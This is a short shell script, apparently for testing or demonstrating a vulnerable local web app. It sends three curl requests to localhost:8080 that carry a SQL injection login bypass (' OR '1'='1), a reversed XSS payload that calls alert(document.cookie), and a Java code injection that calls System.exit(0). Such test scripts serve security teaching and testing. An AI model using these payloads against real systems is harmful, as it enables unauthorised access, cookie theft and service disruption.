#SQL injection
curl -X POST -d "name=admin&password=' OR '1'='1" localhost:8080/sqlijc > users.html
#XSS
curl -X POST -d "string=>tpircs/<;)eikooc.tnemucod(trela>tpIrcs<" localhost:8080/xss > xss.html
#Code injection
curl -X POST -d "jsonString={}');java.lang.System.exit(0);//" localhost:8080/codeijc